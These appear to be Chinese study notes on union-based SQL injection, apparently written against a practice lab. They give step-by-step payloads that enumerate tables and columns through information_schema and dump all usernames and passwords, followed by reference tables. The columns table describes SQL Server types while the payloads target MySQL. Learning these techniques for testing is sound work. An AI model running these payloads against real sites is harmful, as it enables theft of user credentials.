## 基本流程

目标：获取数据库中所有用户名和密码

1. 查找注入点

2. 判断字符型还是数字型----字符型

3. 字符型：找到闭合方式----可以通过单引号闭合 --+注释

4. group by 或者 order by 判断列数

5. 查询回显位 输入一个不存在的 id 使得无效信息不再显示 id=-1' union select 1,2,3--+ 显示 2, 3 说明回显位是 2，3

6. id=-1' union select 1,2,database() --+ 查看database名称拿到库名 security

7. version() 可以查看版本

8. 拿到表名和列名：information_schema数据库中有 columns：列名集合表 和 tables：表名集合表 两个表，通过 union select 1,2,table_name from information_schema.tables where table_schema='security'（甚至直接写 databases()）

9. 用 group_concat() 来显示所有 table_name：union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='security'  .  最终拿到表名 users

10. union select 1,version(),group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users' 获取列名 **用数据库名和数据表名两个来定位所需要的列名** 得到 id username password

11. 回显 username 和 password：

12. ```sql
    union select 1,version(),group_concat(username,'%%%%%',password) from users
    ```



information_schema.tables 结构：

| 字段             | 含义                                  |
| ---------------- | ------------------------------------- |
| Table_catalog    | 数据表登记目录                        |
| **Table_schema** | 数据表所属的数据库名                  |
| **Table_name**   | 表名称                                |
| Table_type       | 表类型[system view\|base table]       |
| Engine           | 使用的数据库引擎[MyISAM\|CSV\|InnoDB] |
| Version          | 版本，默认值10                        |
| Row_format       | 行格式[Compact\|Dynamic\|Fixed]       |
| Table_rows       | 表里所存多少行数据                    |
| Avg_row_length   | 平均行长度                            |
| Data_length      | 数据长度                              |
| Max_data_length  | 最大数据长度                          |
| Index_length     | 索引长度                              |
| Data_free        | 空间碎片                              |
| Auto_increment   | 做自增主键的自动增量当前值            |
| Create_time      | 表的创建时间                          |
| Update_time      | 表的更新时间                          |
| Check_time       | 表的检查时间                          |
| Table_collation  | 表的字符校验编码集                    |
| Checksum         | 校验和                                |
| Create_options   | 创建选项                              |
| Table_comment    | 表的注释、备注                        |

information_schema.columns 结构：

| 列名                     | 数据类型       | 描述                                                         |
| :----------------------- | :------------- | :----------------------------------------------------------- |
| TABLE_CATALOG            | nvarchar(128)  | 表限定符。                                                   |
| **TABLE_SCHEMA**         | nvarchar(128)  | 表所有者。                                                   |
| **TABLE_NAME**           | nvarchar(128)  | 表名。                                                       |
| **COLUMN_NAME**          | nvarchar(128)  | 列名。                                                       |
| ORDINAL_POSITION         | smallint       | 列标识号。                                                   |
| COLUMN_DEFAULT           | nvarchar(4000) | 列的默认值。                                                 |
| IS_NULLABLE              | varchar(3)     | 列的为空性。如果列允许 NULL，那么该列返回 YES。否则，返回 NO。 |
| DATA_TYPE                | nvarchar(128)  | 系统提供的数据类型。                                         |
| CHARACTER_MAXIMUM_LENGTH | smallint       | 以字符为单位的最大长度，适于二进制数据、字符数据，或者文本和图像数据。否则，返回 NULL。有关更多信息，请参见数据类型。 |
| CHARACTER_OCTET_LENGTH   | smallint       | 以字节为单位的最大长度，适于二进制数据、字符数据，或者文本和图像数据。否则，返回 NULL。 |
| NUMERIC_PRECISION        | tinyint        | 近似数字数据、精确数字数据、整型数据或货币数据的精度。否则，返回 NULL。 |
| NUMERIC_PRECISION_RADIX  | smallint       | 近似数字数据、精确数字数据、整型数据或货币数据的精度基数。否则，返回 NULL。 |
| NUMERIC_SCALE            | tinyint        | 近似数字数据、精确数字数据、整数数据或货币数据的小数位数。否则，返回 NULL。 |
| DATETIME_PRECISION       | smallint       | datetime 及 SQL-92 interval 数据类型的子类型代码。对于其它数据类型，返回 NULL。 |
| CHARACTER_SET_CATALOG    | varchar(6)     | 如果列是字符数据或 text 数据类型，那么返回 master，指明字符集所在的数据库。否则，返回 NULL。 |
| CHARACTER_SET_SCHEMA     | varchar(3)     | 如果列是字符数据或 text 数据类型，那么返回 DBO，指明字符集的所有者名称。否则，返回 NULL。 |
| CHARACTER_SET_NAME       | nvarchar(128)  | 如果该列是字符数据或 text 数据类型，那么为字符集返回唯一的名称。否则，返回 NULL。 |
| COLLATION_CATALOG        | varchar(6)     | 如果列是字符数据或 text 数据类型，那么返回 master，指明在其中定义排序次序的数据库。否则此列为 NULL。 |
| COLLATION_SCHEMA         | varchar(3)     | 返回 DBO，为字符数据或 text 数据类型指明排序次序的所有者。否则，返回 NULL。 |
| COLLATION_NAME           | nvarchar(128)  | 如果列是字符数据或 text 数据类型，那么为排序次序返回唯一的名称。否则，返回 NULL。 |
| DOMAIN_CATALOG           | nvarchar(128)  | 如果列是一种用户定义数据类型，那么该列是某个数据库名称，在该数据库名中创建了这种用户定义数据类型。否则，返回 NULL。 |
| DOMAIN_SCHEMA            | nvarchar(128)  | 如果列是一种用户定义数据类型，那么该列是这种用户定义数据类型的创建者。否则，返回 NULL。 |
| DOMAIN_NAME              | nvarchar(128)  | 如果列是一种用户定义数据类型，那么该列是这种用户定义数据类型的名称。否则，返回 NULL。 |